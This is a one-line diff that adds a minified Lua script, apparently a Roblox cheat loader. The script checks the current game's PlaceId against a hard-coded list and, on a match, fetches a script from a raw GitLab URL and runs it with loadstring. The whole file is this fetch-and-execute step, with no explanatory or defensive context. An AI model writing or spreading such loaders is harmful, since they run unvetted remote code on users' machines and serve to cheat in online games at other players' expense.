@@ -1,0 +1,1 @@
+local a={96537472072550,10324346056,9872472334,10662542523,10324347967,121271605799901,10808838353,11353528705,99214917572799}local b=false;for c,d in ipairs(a)do if game.PlaceId==d then b=true;break end end;if b then loadstring(game:HttpGet("https://gitlab.com/itskimii/nonimus/-/raw/main/games/evade.lol"))()end
